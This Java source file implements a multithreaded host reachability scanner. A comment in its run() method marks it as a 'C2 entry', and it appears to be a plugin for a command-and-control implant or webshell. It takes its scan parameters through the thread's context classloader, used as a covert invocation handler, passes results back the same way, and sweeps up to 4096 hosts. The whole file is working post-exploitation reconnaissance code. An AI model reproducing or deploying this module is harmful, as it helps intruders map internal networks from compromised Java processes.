package org.leo.core.component;

import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 主机可达性检测组件
 * 提供多线程同步主机可达性检测功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class HostIsReachableComponent implements Runnable, ThreadFactory {

    private static final int MAX_THREADS = 64;
    private static final int MAX_HOSTS = 4096;
    private static final int MAX_TIMEOUT_MS = 300000;
    private static final AtomicInteger THREAD_SEQUENCE = new AtomicInteger();

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    // 用于单个主机检测的实例变量
    private String scanHost;
    private int scanTimeout;
    private List reachableHostList;
    private List unreachableHostList;
    private CountDownLatch latch;
    private boolean workerMode;
    private String threadSeed;

    


    public void invoke() throws Exception {
        scanHosts(params);
    }

    public HostIsReachableComponent() {
    }

    public HostIsReachableComponent(String scanHost, int scanTimeout, 
                                     List reachableHostList, List unreachableHostList, 
                                     CountDownLatch latch) {
        this.scanHost = scanHost;
        this.scanTimeout = scanTimeout;
        this.reachableHostList = reachableHostList;
        this.unreachableHostList = unreachableHostList;
        this.latch = latch;
        this.workerMode = true;
    }

    @Override
    public void run() {
        // C2 入口：newInstance() 创建时字段为 null，线程工人构造器会设置字段
        if (!workerMode) {
            java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
            try {
                params = (java.util.HashMap) h.invoke(null, null, null);
                results = new java.util.HashMap();
                invoke();
            } catch (Throwable t) {
                if (results == null) results = new java.util.HashMap();
                results.put("code", Integer.valueOf(500));
                results.put("msg", t.getMessage());
            }
            if (results != null) {
                try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
            }
            return;
        }
        boolean reachable = isReachable(scanHost, scanTimeout);
        if (latch != null) {
            synchronized (latch) {
                if (reachable) {
                    reachableHostList.add(scanHost);
                } else {
                    unreachableHostList.add(scanHost);
                }
                latch.countDown();
            }
        }
    }

    /**
     * 同步检测多个主机的可达性
     * 
     * @param params 参数Map，包含：
     *               - scanHosts: 要检测的主机数组（必需）
     *               - scanTimeout: 检测超时时间，单位毫秒（可选，默认3000）
     */
    private void scanHosts(HashMap params) throws Exception {
        Object hostsObj = params.get("scanHosts");
        if (!(hostsObj instanceof List) || ((List) hostsObj).isEmpty()) {
            throw new IllegalArgumentException("scanHosts参数不能为空");
        }
        List scanHostsList = (List) hostsObj;
        if (scanHostsList.size() > MAX_HOSTS) {
            throw new IllegalArgumentException("too many scan hosts, max=" + MAX_HOSTS);
        }
        
        // 转换主机数组
        String[] scanHosts = new String[scanHostsList.size()];
        for (int i = 0; i < scanHostsList.size(); i++) {
            Object hostObj = scanHostsList.get(i);
            String host = hostObj == null ? null : toHost(hostObj).trim();
            if (host == null || host.length() == 0) {
                throw new IllegalArgumentException("scanHosts 包含空主机，索引: " + i);
            }
            scanHosts[i] = host;
        }

        // 获取超时时间，默认3000毫秒
        Object timeoutObj = params.get("scanTimeout");
        int scanTimeout = (timeoutObj instanceof Number) ? ((Number) timeoutObj).intValue() : 3000;
        if (scanTimeout <= 0) scanTimeout = 3000;
        if (scanTimeout > MAX_TIMEOUT_MS) scanTimeout = MAX_TIMEOUT_MS;

        // 使用线程安全的列表
        List reachableHostList = Collections.synchronizedList(new ArrayList());
        List unreachableHostList = Collections.synchronizedList(new ArrayList());

        // 有多少host就启动多少线程
        int hostCount = scanHosts.length;
        int threadCount = Math.min(hostCount, MAX_THREADS);
        threadSeed = String.valueOf(params.get("hostId")) + "|" + hostCount;
        ExecutorService pool = Executors.newFixedThreadPool(threadCount, this);
        CountDownLatch latch = new CountDownLatch(hostCount);

        boolean completed = false;
        try {
            // 为每个host启动一个线程
            for (int i = 0; i < scanHosts.length; i++) {
                pool.execute(new HostIsReachableComponent(scanHosts[i], scanTimeout,
                                                          reachableHostList, unreachableHostList, 
                                                          latch));
            }

            // 等待所有线程完成
            long batches = (hostCount + threadCount - 1L) / threadCount;
            long waitMillis = batches * (long) scanTimeout + 5000L;
            if (waitMillis > MAX_TIMEOUT_MS) waitMillis = MAX_TIMEOUT_MS;
            completed = latch.await(waitMillis, TimeUnit.MILLISECONDS);

            ArrayList reachableSnapshot;
            ArrayList unreachableSnapshot;
            int pendingCount;
            synchronized (latch) {
                reachableSnapshot = new ArrayList(reachableHostList);
                unreachableSnapshot = new ArrayList(unreachableHostList);
                pendingCount = (int) latch.getCount();
            }

            // 返回结果
            results.put("code", 200);
            results.put("reachableHostList", reachableSnapshot);
            results.put("unreachableHostList", unreachableSnapshot);
            results.put("totalCount", hostCount);
            results.put("reachableCount", reachableSnapshot.size());
            results.put("unreachableCount", unreachableSnapshot.size());
            results.put("pendingCount", Integer.valueOf(pendingCount));
            results.put("timedOut", Boolean.valueOf(!completed));
        } finally {
            if (completed) pool.shutdown(); else pool.shutdownNow();
        }
    }

    public Thread newThread(Runnable task) {
        Thread thread = new Thread(task,
                "worker-" + Integer.toHexString(String.valueOf(threadSeed).hashCode()) + "-"
                        + THREAD_SEQUENCE.incrementAndGet());
        thread.setDaemon(true);
        return thread;
    }

    private String toHost(Object value) throws Exception {
        if (value instanceof byte[]) return new String((byte[]) value, "UTF-8");
        return String.valueOf(value);
    }

    /**
     * 检测主机是否可达
     * 
     * @param host 主机地址（IP或域名）
     * @param timeout 超时时间，单位毫秒
     * @return true表示可达，false表示不可达
     */
    private boolean isReachable(String host, int timeout) {
        try {
            InetAddress inet = InetAddress.getByName(host);
            return inet.isReachable(timeout);
        } catch (Exception e) {
            return false;
        }
    }
}
